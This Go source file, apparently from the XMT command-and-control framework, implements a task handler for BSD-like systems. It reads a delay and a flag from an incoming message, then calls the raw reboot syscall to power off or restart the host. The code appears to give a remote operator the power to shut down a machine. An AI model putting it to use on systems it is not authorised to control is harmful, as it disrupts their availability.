//go:build !windows && !plan9 && !js && !linux && !android && !aix && !illumos && !solaris

// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package task

import (
	"context"
	"syscall"
	"time"

	"github.com/iDigitalFlame/xmt/data"
)

func taskShutdown(_ context.Context, r data.Reader, _ data.Writer) error {
	if _, err := r.StringVal(); err != nil {
		return err
	}
	t, err := r.Uint32()
	if err != nil {
		return err
	}
	if _, err := r.Uint32(); err != nil {
		return err
	}
	v, err := r.Uint8()
	if err != nil {
		return err
	}
	x := uintptr(0x4000)
	if v&1 != 0 {
		x = 0
	}
	if t > 0 {
		time.Sleep(time.Second * time.Duration(t))
	}
	if o, _, err := syscall.Syscall6(syscall.SYS_REBOOT, x, 0, 0, 0, 0, 0); o != 0 {
		return err
	}
	return nil
}
